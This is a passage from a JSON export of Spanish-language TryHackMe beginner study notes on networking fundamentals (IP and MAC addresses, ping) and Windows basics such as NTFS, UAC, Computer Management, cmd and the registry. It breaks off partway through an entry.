    "content": "Las redes son cosas conectadas, por ejemplo tu grupo de amigos. Las redes se pueden dar en todos los √°mbitos de la vida:\n\n- El sistema de transporte de una ciudad.\n- Infraestructuras como la red el√©ctrica.\n- Sistemas postales.\n\nM√°s espec√≠ficamente, en inform√°tica, las redes tienen la misma idea aplicada a los dispositivos tecnol√≥gicos. Una red puede estar formada desde 2 hasta millones de dispositivos.\n\n![[descargar.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. What is the Internet",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/2-what-is-the-internet/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/2. What is the Internet.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
    "content": "Ahora que hemos explorado lo que es una red investigaremos internet.\nInternet es una red gigante que consta de muchas redes peque√±as dentro de s√≠ misma. Usando nuestro ejemplo de la tarea anterior imaginemos que Alice hizo nuevos amigos (Zayn y Toby) a los que quiere presentar a sus otros amigos (Bob y Jim). El problema es que Alice es la √∫nica persona que habla el mismo idioma que Zayn y Bob por lo que tendr√° que ser ella quien haga de mensajera.\n![[descargar.png]]\n\n-------------\nLa primera interacci√≥n de Internet fue ARPANET en la d√©cada de 1960. Sin embargo no fue hasta 1989 cuando apareci√≥ la **W**orld **W**ide **W**eb (WWW) gracias a Tim Bersners-Lee.![[descargar1.png]]\nEste es el esquema de Internet: ![[descargar2.png]]\n\nLas redes peque√±as que componen internet se llaman redes privadas mientras que las que conectan unas con otras son redes p√∫blicas, o Internet.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Identifying Devices on a Network",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/3-identifying-devices-on-a-network/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/3. Identifying Devices on a Network.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
    "content": "Para comunicarse y mantener el orden, los dispositivos necesitan ser identificables e identificadores en la red.\nLos dispositivos en una red son muy similares a los humanos, en el hecho de que tenemos dos formas de ser identificados:\n- Nuestro nombre.\n- Nuestras huellas.\nPodemos llegar a cambiarnos el nombre, pero no podemos cambiar nuestras huellas. Los dispositivos son iguales:\n- Direcci√≥n IP.\n- Direcci√≥n MAC.\n\n----------------\n<h2>Direcciones IP</h2>\nUna direcci√≥n IP (Internet Protocol) puede ser usada como una manera de identificar un host en una red durante un periodo de tiempo durante el cual ese dispositivo y esa direcci√≥n est√°n asociadas.\n\n| Octeto 1 | Octeto 2 | Octeto 3 | Octeto 4 |\n| -------- | -------- | -------- | -------- |\n| 192      | 168      | 1        | 1        |\n| 0-255    | 0-255    | 0-255    | 0-255    |\nEs un set de n√∫meros divididos en en octetos. El valor de la IP se calcula con una t√©cnica llamada *IP addressing y subnetting*. Lo que es importante de entender es que **las direcciones IP pueden cambiar de dispositivo a dispositivo pero no pueden estar simult√°neamente m√°s de una vez dentro de la misma red**.\n\nLas direcciones IP siguen un conjunto de reglas llamadas protocolos. Estos son el esqueleto del networking.\n\nUna red p√∫blica es usada para identificar los dispositivos en Internet mientras que una red privada es usada para identificar un dispositivo entre otros.\n\n| **Device Name** | **IP Address** | **IP Address Type** |\n| --------------- | -------------- | ------------------- |\n| DESKTOP-KJE57FD | 192.168.1.77   | Private             |\n| DESKTOP-KJE57FD | 86.157.52.21   | Public              |\n| CMNatic-PC      | 192.168.1.74   | Private             |\n| CMNatic-PC      | 86.157.52.21   | Public              |\nDESKTOP y CMNatic ser√°n capaces de usar sus IPs privadas para comunicarse entre ellos. De todas formas cualquier informaci√≥n transmitida a trav√©s de internet deber√° ser comunicada usando las direcciones IP p√∫blicas.\n\nLas direcciones IP p√∫blicas son asignadas mediante ISP (Internet Service Provider).\n\n------------------\nA medida que los dispositivos existentes aumentan en el mundo, se est√° volviendo m√°s complicado asignar IPs dentro del protocolo IPv4. Es por esto que se origina IPv6 (2^32 vs 2^128 direcciones IP) resolviendo el principal problema de IPv4. De cualquier forma este es un proceso lento.\n\n---------------------------\n<h2>Direcciones MAC</h2>\nCada dispositivo en una red tiene una interfaz f√≠sica con una direcci√≥n MAC √∫nica, asignada de f√°brica. Esta direcci√≥n es un c√≥digo hexadecimal de 12 caracteres (como¬†`a4:c3:f0:85:ac:2d`), donde los primeros seis d√≠gitos identifican al fabricante y los √∫ltimos seis son un identificador √∫nico del dispositivo.\n\nSin embargo, las direcciones MAC pueden falsificarse (*spoofing*), lo que permite que un dispositivo se haga pasar por otro. Esto puede enga√±ar sistemas de seguridad mal configurados, como un firewall que permita acceso basado solo en la MAC de un administrador.\n\nEn redes p√∫blicas (caf√©s, hoteles), el control por MAC a veces se usa para gestionar accesos o ofrecer servicios premium. Aunque √∫til, este m√©todo no es totalmente seguro si no se combina con otras medidas de protecci√≥n.\n\nLas direcciones MAC identifican dispositivos, pero su suplantaci√≥n revela vulnerabilidades en redes que dependen exclusivamente de ellas para la seguridad.\n\n-----------------\n<h2>Practica</h2>\n>*El laboratorio simula una red Wi-Fi de cafeter√≠a donde tienes que pagar por el servicio.*\n\n1. ![[Pasted image 20250410220242.png]]\n2. Cambiamos la MAC a la misma que la de Alice (MAC spoofing):![[Pasted image 20250410220339.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Ping (ICMP)",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/4-ping-icmp/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/4. Ping (ICMP).md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
    "content": "Ping usa el protocolo ICMP (Internet Control Message Protocol) para determinar la conexi√≥n entre dos dispositivos.\n\n```bash\nping -c 1 <ip/URL)>\n```\n\n![[Pasted image 20250411201247.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. The Desktop (GUI)",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/3-the-desktop-gui/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/3. The Desktop (GUI).md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "La GUI (Graphical User Interface) es la pantalla que te da la bienvenida al sistema una vez abres tu m√°quina Windows.\n\nHabitualmente debes pasar la pantalla de inicio de sesi√≥n primero. En la imagen de abajo vemos un escritorio de Windows 10.\n\n![[034.png]]\n\n1. Escritorio.\n2. Men√∫ de Inicio.\n3. Barra de b√∫squeda.\n4. Barra de Tareas.\n5. Barra de Herramientas.\n6. √Årea de Notificaciones.\n\n<h2>El escritorio</h2>\nEs donde est√°n son atajos a los programas, archivos, ficheros, etc. Al hacer click derecho sobre el escritorio, se despliega una tabla con opciones. En Display Settings, puedes hacer cambios a la resoluci√≥n y orientaci√≥n a la pantalla. En caso de tener varias pantallas puedes configurarlas aqu√≠. Tambi√©n puedes cambiar el fondo de pantalla en Personalize.\n\n---------------\n<h2>El men√∫ de inicio</h2>\nOtorga acceso a todas las apps, archivos y dem√°s. Al hacer click en √©l se desplegar√°. Este est√° formado por varias secciones:\n\n![[035.png]]\n\n1. Esta secci√≥n nos ofrece atajos r√°pidos a acciones que podemos realizar con nuestra cuenta.\n2. En esta otra secci√≥n vemos un atajo a todos aquellos programas que hayan sido a√±adidos recientemente.\n3. Aqu√≠ se encuentran las tiles (los programas a√±adidos a esta secci√≥n). Al hacer click en ellos, se despliega un men√∫ de opciones. Puedes a√±adir aplicaciones haciendo click derecho y luego pin.\n\n---------------\n<h2>La barra de tareas</h2>\nAlgunos de los componentes est√°n activados y son visibles por defecto (fijados). Esto es √∫til porque podemos decidir qu√© programas fijamos y cu√°les no para m√°s eficacia a la hora de trabajar.\n\nPasar por encima del icono nos dar√° una previsualizaci√≥n de la aplicaci√≥n. Adem√°s si tenemos m√°s de una instancia abierta de la misma aplicaci√≥n nos mostrar√° todas con su nombre arriba, lo que es √∫til para diferenciarlas.\n\nSi cierras programas que no est√°n anclados a la barra de tareas desaparecer√°n de estas.\n\n------------------\n<h2>El √°rea de notificaciones</h2>\nEst√° habitualmente en la parte de abajo a la derecha de la pantalla. Es donde se muestran la fecha y la hora. Otros iconos que se pueden ver son el de la conexi√≥n, el volumen, etc.\n\nHaciendo click derecho y despu√©s en Taskbar settings puedes editar los iconos que salen en ese √°rea.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Settings and the Control Panel",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/8-settings-and-the-control-panel/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/8. Settings and the Control Panel.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "En un sistema Windows, las localizaciones principales para hacer cambios son el men√∫ de ajustes y el panel de control.\n\nEl men√∫ de ajustes fue introducido junto con Windows 8 pero sigue disponible a d√≠a de hoy. Hay parecidos y diferencias entre los dos:\n\n<h6>Men√∫ de Ajustes:</h6>\n![[037.png]]\n<h6>Panel de Control:</h6>\n![[038.png]]\n\n\nEl panel de control es donde acceder√°s para ajustes m√°s complejos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. The Windows System32 Folders",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/5-the-windows-system32-folders/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/5. The Windows System32 Folders.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El fichero `C:\\Windows` es tradicionalmente conocido como el fichero que contiene el sistema operativo de Windows. Este fichero no tiene por qu√© estar en C. Ni siquiera tiene por que estar en el mismo drive.\n\nEs aqu√≠ donde entran en juego las variables de entorno. La variable de entorno para el directorio Windows es `%windir%`. \n\nLos ficheros de System32 son cr√≠ticos para el sistema operativo y muy importantes. El borrado accidental de cualquier fichero ubicado dentro de Windows32 puede dejar inutilizable el sistema operativo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Windows",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/1-introduction-to-windows/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/1. Introduction to Windows.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El sistema operativo Windows es un producto complejo con muchos nombres de archivos, utilidades, ajustes, funcionalidades, etc.\n\nEn este m√≥dulo intentaremos otorgar una visi√≥n general de un pu√±ado de lo que hace al SO Windows, navegar la interfaz, hacer cambios al sistema y m√°s.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Windows Editions",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/2-windows-editions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/2. Windows Editions.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El sistema operativo Windows tiene una larga historia, remont√°ndose hasta 1985. Actualmente es el sistema operativo dominante entre usuarios y empresas.\n\nPrimero hubo Windows XP. Cuando se anunci√≥ que se dejar√≠a de dar soporte a este mucha gente se asust√≥ y los vendedores de productos tuvieron que ir a contrarreloj para asegurarse de que sus productos funcionaban con Windows 7, el siguiente a XP, puesto que entre medias hab√≠a habido un intento llamado Windows Vista que no fue nada bien acogido.\n\nPoco despu√©s sacaron Windows 8.x, el cu√°l tuvo el mismo problema que Windows Vista.\n\nDespu√©s de esto vinieron Windows 10 y Windows 11 (el actual).\n\nEn Windows Pro puedes activar la encriptaci√≥n de BitLocker mientras que en Windows Home no.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. User Account Control",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/7-user-account-control/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/7. User Account Control.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "La gran mayor√≠a de usuarios dom√©sticos est√°n logueados en sus sistemas como administradores locales. Para el uso dom√©stico no hace falta, por lo general, tener tantos privilegios. Esto incrementa enormemente el riesgo para los usuarios.\n\nPara proteger al usuario local con estos privilegios, Microsoft introdujoi el UAC (User Account Control). Este concepto fue introducido de la mano de Windows Vista (visto en [[2. Windows Editions]]).\n\nUAC funciona de la siguiente manera. Cuando un usuario con una cuenta de tipo administrador inicia sesi√≥n en el sistema, la versi√≥n actual no corre con permisos elevados. De tal manera que cuando sea necesario ejecutar altos privilegios, se le pedir√° la contrase√±a al usuario para saber si est√° de acuerdo con esta acci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. The File System",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/4-the-file-system/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/4. The File System.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El sistema de archivos usado en versiones modernas de Windows es NTFS (New Technology File System). Antes de esto estuvieron FAT16/FAT32 (File Allocation Table) y HPFS (High Performance File System).\n\nTodav√≠a se ven las particiones FAT hoy en d√≠a, sobretodo en dispositivos como USB, MicroSD, etc.\n\nNTFS es conocido como un sistema de ficheros \"journaling\". Puede reparar archivos y ficheros del disco en caso de falla usando informaci√≥n que se guarda en el disco. Esta funci√≥n no es posible con FAT.\n\nNTFS combate muchas de las limitaciones de los sistemas de ficheros previos:\n\n- Soporta archivos mayores que 4 GB.\n- Puede aportar permisos espec√≠ficos a archivos y ficheros.\n- Compresi√≥n de archivos y ficheros.\n- Encriptaci√≥n (Encryption File System o EFS).\n\n[Aqu√≠](https://docs.microsoft.com/en-us/troubleshoot/windows-client/backup-and-storage/fat-hpfs-and-ntfs-file-systems) puedes encontrar la documentaci√≥n oficial de Windows de FAT, HPFS y NTFS.\n\nEn vol√∫menes NTFS puedes establecer permisos que den o denieguen acceso a archivos o ficheros. Estos son:\n\n- Control absoluto.\n- Modificar.\n- Leer y ejecutar.\n- Listar contenidos del fichero.\n- Escribir.\n- Leer.\n\nPara ver permisos de un archivo o fichero:\n\n1. Click derecho en el archivo o fichero.\n2. Seleccionar Propiedades.\n3. Seleccionar la pesta√±a Seguridad.\n4. En la lista de nombre de usuarios o grupos selecciona aquella persona/grupo del cual quieras ver los permisos.\n\nOtra peculiaridad de NTFS es ADS (Alternate Data Streams). Es un atributo espec√≠fico de Windows NTFS.\n\nTodos los archivos tienen al menos un data stream ($DATA) y ADS permite a los archivos tener m√°s de uno. Para ver esta informaci√≥n debemos hacer uso de la Powershell.\n\nLos desarrolladores de malware han utilizado hist√≥ricamente este ADS para esconder informaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Task Manager",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/9-task-manager/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/9. Task Manager.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El gestor de tareas nos da informaci√≥n sobre las publicaciones y procesos corriendo en el sistema. Otra informaci√≥n tambi√©n est√° disponible como cu√°nta CPU y RAM est√°n siendo utilizadas.\n\nPuedes acceder haciendo click derecho en la barra de tareas y luego en Task Manager.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. User Accounts, Profiles and Permissions",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/6-user-accounts-profiles-and-permissions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/6. User Accounts, Profiles and Permissions.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "Las cuentas de usuarios pueden ser de dos tipos principalmente: Administrador o Usuario est√°ndar.\n\nEl tipo de cuenta determina qu√© acciones se pueden llevar a cabo.\n\n- Un administrador puede hacer cambios al sistema: a√±adir usuarios, eliminarlos, modificar grupos, cambiar ajustes del sistema, etc.\n- Un usuario est√°ndar s√≥lo puede hacer cambios en carpetas o archivos atribu√≠dos a √©l y no puede hacer modificaciones a nivel de sistema, como instalar programas.\n\nHay varias maneras de ver qu√© usuarios existen en el sistema. Una manera es hacer click en `Start Menu` y escribir `Other user`. Un atajo de `System Settings > Other users` aparecer√°.\n\nCada usuario se localiza en `C:\\Users`. Todos ellos tendr√°n las mismas carpetas iniciales. Algunas son:\n\n- Desktop\n- Documents\n- Downloads\n- Music\n- Pictures\n\nOtra manera de acceder a esta informaci√≥n es hacer click derecho en el men√∫ de inicio y seleccionar `Run`. Despu√©s escribir `lusrmgr.msc`.\n\n![[036.gif]]\n\nAll√≠ deber√≠as ver dos carpetas: **Users** y **Groups**.\n\nSi haces click en grupos, ver√°s los nombres de los grupos locales con una breve descripci√≥n de cada uno.\n\nCada uno de estos grupos tiene permisos ya dados por el administrador. Cuando un usuario es asignado a un grupo, adquiere los permisos de ese grupo. Un usuario puede ser asignado a m√∫ltiples grupos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Windows Fundamentals 1",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/0-windows-fundamentals-1/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/0. Windows Fundamentals 1.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "[[1. Introduction to Windows]]\n[[2. Windows Editions]]\n[[3. The Desktop (GUI)]]\n[[4. The File System]]\n[[5. The Windows System32 Folders]]\n[[6. User Accounts, Profiles and Permissions]]\n[[7. User Account Control]]\n[[8. Settings and the Control Panel]]\n[[9. Task Manager]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Windows Fundamentals 2",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/0-windows-fundamentals-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/0. Windows Fundamentals 2.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/1. Introduction|1. Introduction]]\n[[2. System Configuration]]\n[[3. Change UAC Settings]]\n[[4. Computer Management]]\n[[5. System Information]]\n[[6. Resource Monitor]]\n[[7. Command Prompt]]\n[[8. Registry Editor]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "En [[1. Introduction to Windows]] vimos sobre el sistema de ficheros, el control de usuarios, el panel de control y el controlador de tareas.\n\nEn este m√≥dulo cubriremos otras utilidades disponibles en Windows.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Command Prompt",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/7-command-prompt/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/7. Command Prompt.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Continuamos con las herramientas del panel de configuraci√≥n del sistema.\n\nLa l√≠nea de comandos (`cmd`), puede parecer un poco intimidante al principio.\n\nAqu√≠ veremos algunos de los comandos que se pueden utilizar:\n\nEmpezaremos con `hostname` y `whoami`.\n\n```PowerShell\nC:\\Users\\Administrator> hostname\nTHM-WINFUN2\n```\n\n```PowerShell\nC:\\Users\\Administrator> whoami\nthm-winfun2\\administrator\n```\n\nAhora veremos comandos √∫tiles en la resoluci√≥n de problemas:\n\n```PowerShell\nC:\\Users\\Administrator> ipconfig\n\nWindows IP Configuration\n\nEthernet adapter Ethernet:\n\n\tConnection-specific DNS Suffix. . .eu-xxxxxxxxxxxxxxxx.internal\n\tLink-local IPv6 Address . . . . . .fe80::6486:c81a:3db5:a0ed%7\n\tIPv4 Address. . . . . . . . . . . . 10.10.x.x\n\tSubnet Mask . . . . . . . . . . . . 255.255.0.0\n\tDefault Gateway . . . . . . . . . . 10.10.x.x\n```\n\nTodos los comandos tienen un manual de ayuda para explicar la sintaxis esperada del comando, junto con otros par√°metros adicionales opcionales. Para ver este manual hay que a√±adir `/?` al final del comando, por ejemplo: `ipconfig /?`.\n\nPara limpiar la pantalla el comando es `cls`.\n\nEl comando `netstat` nos mostrar√° estad√≠sticas del protocolo y las conexiones actuales de la red en TCP-IP.\n\nEl comando `net` se utiliza por lo general para controlar los recursos de la red. Para ver ayuda en este comando, `/?` no funcionar√°. En su lugar hay que usar `help`: `net help`. Si deseas ver ayuda parra el comando `net user`, por ejemplo, el comando ser√≠a `net help user`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Computer Management",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/4-computer-management/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/4. Computer Management.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Seguimos con herramientas disponibles en el panel de configuraci√≥n del sistema.\n\nLa utilidad del gestor del ordenador (Computer Management) `compmgmt`, tiene tres secciones, primariamente: `System Tools`, `Storage` y `Services and Applications`.\n\n<h2>System Tools</h2>\nEmpezaremos con el organizador de tareas (Task Scheduler). Con √©l podemos crear y dirigir tareas que nuestro ordenador ejecutar√° cuando le digamos.\n\nPara crear una tarea le damos a `Crate Basic Task` debajo de `Actions`.\n\nDespu√©s viene el visor de eventos (Event Viewer). Nos permite ver eventos que han ocurrido en el ordenador. Pueden ser entendidos como logs que nos permiten auditar la integridad del sistema.\n\nEl visor de eventos tiene tres partes:\n\n1. La parte de la izquierda nos da un listado jer√°rquico en √°rbol de los proveedores de logs de eventos.\n2. El medio nos ense√±a una vista general y un resumen de los eventos espec√≠ficos seleccionados.\n3. El lado de la derecha nos muestra las acciones.\n\nHay cinco tipos de eventos que pueden ser registrados:\n\n![[039.png]]\n\nLos logs est√°ndar son visibles debajo de `Windows Logs`:\n\n![[040.png]]\n\nEn `Shared Folders` (carpetas compartidas), ver√°s una lista completa de los archivos y carpetas compartidos a los que otros pueden acceder/conectarse.\n\nLa compartici√≥n de Windows por defecto se llama `C$`:\n\n![[041.png]]\n\nDebajo de `Sessions` puedes ver a usuarios que est√°n conectados a los shares. Y todos los archivos a los que accedan se listar√°n debajo de `Open Files`.\n\nLa secci√≥n de usuarios y grupos locales deber√≠a sonarte pues la vimos en [[6. User Accounts, Profiles and Permissions]]. Es `lusrmgr.msc`.\n\nEn `Performance` ver√°s una utilidad llamada `Performance Monitor` (`perfmon`). Es usada para ver la informaci√≥n en tiempo real o de un archivo log.\n\n`Device Manager` nos permite ver y configurar el hardware como deshabilitar cualquier parte unida al ordenador.\n\n![[042.png]]\n\n-------------------\n<h2>Storage</h2>\nEn Storage se encuentran `Windows Server Backup` y `Disk Management`.\n\nDisk Management es una utilidad del sistema en Windows que nos permite realizar tareas de almacenaje complejas. Algunas son:\n\n- Montar un nuevo disco.\n- Extender una partici√≥n.\n- Reducir una partici√≥n.\n- Asignar o cambiar la letra de un disco (por ejemplo `E:`).\n\n![[043.png]]\n\n-------------------\n<h2>Services and Applications</h2>\nUn servicio es un tipo de aplicaci√≥n especial que corre en el fondo (bg). Aqu√≠ a parte de activar o desactivar el servicio, puedes ver sus propiedades.\n\n![[044.png]]\n\nWMI (Windows Management Instrumentation) es el servicio que configura y controla precisamente la instrumentaci√≥n del Windows Manager.\n\nEn versiones modernas esta `deprecated`. Powershell la ha sustituido.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Registry Editor",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/8-registry-editor/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/8. Registry Editor.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Continuamos con las herramientas disponibles a trav√©s del panel de configuraci√≥n del sistema.\n\nEl registro de Windows (Windows Registry) es una base de datos central usada para guardar informaci√≥n necesaria para configurar el sistema por uno o m√°s usuarios, aplicaciones y dispositivos de hardware.\n\nContiene informaci√≥n que se referencia constantemente en procesos como:\n\n- Perfiles de cada usuario.\n- Aplicaciones instaladas en el ordenador y los tipos de documentos que cada uno puede crear.\n- Hojas de propiedad de archivos y ficheros.\n- Qu√© hardware existe en el sistema.\n- Los puertos usados.\n\n>[!WARNING] El registro de Windows no es para usuarios no avanzados y modificarlo puede afectar al correcto desarrollo del sistema operativo.\n\nPara acceder podemos escribir `regedit`.\n\n![[045.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Change UAC Settings",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/3-change-uac-settings/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/3. Change UAC Settings.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Vamos a continuar con herramientas disponibles a trav√©s del panel de configuraci√≥n de sistema.\nCubrimos UAC en gran detalle en [[7. User Account Control]]. Estos ajustes (UAC) pueden ser modificados o apagados por completo (aunque no se recomienda).\n\nHabiendo entrado en `msconfig` podemos ejecutar `C:\\Windows\\System32\\UserAc.cou` en la pesta√±a tools y arrastrar la barra para ver como van cambiando los ajustes del UAC.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. System Information",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/5-system-information/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/5. System Information.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Seguiremos con herramientas disponibles en el panel de configuraci√≥n del sistema.\n\n¬øQu√© es la herramienta de informaci√≥n del sistema `msinfo32`?\n\nSe ejecuta con `Msinfo32.exe`. Recolecta informaci√≥n sobre tu ordenador y te la ense√±a de una manera entendible. El resumen de sistema (System Summary) est√° dividida en tres secciones:\n\n1. Hardware Resources: No es para el usuario medio. Contiene informaci√≥n t√©cnica.\n2. Components: Aqu√≠ puedes ver informaci√≥n espec√≠fica sobre los dispositivos de hardware instalados.\n3. Software environment: Aqu√≠ puedes ver informaci√≥n del software preinstalado y el que hayas instalado t√∫. Aqu√≠ aparecen: `Environment Variables` y `Network Connections`.\n\nEn [[5. The Windows System32 Folders]] tocamos de manera breve las variables de entorno. Al hacer click en `Environment Variables` entramos en el panel. Otra manera de acceder es `Control Panel > System and Security > System > Advanced system settings > Environment Variables` **√ì** `Settings > System > About > system info > Advanced system settings > Environment Variables`.\n\nEn la herramienta `msinfo32` hay una barra de b√∫squeda en la parte inferior. Ah√≠ puedes buscar cosas como `IP address`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. System Configuration",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/2-system-configuration/",
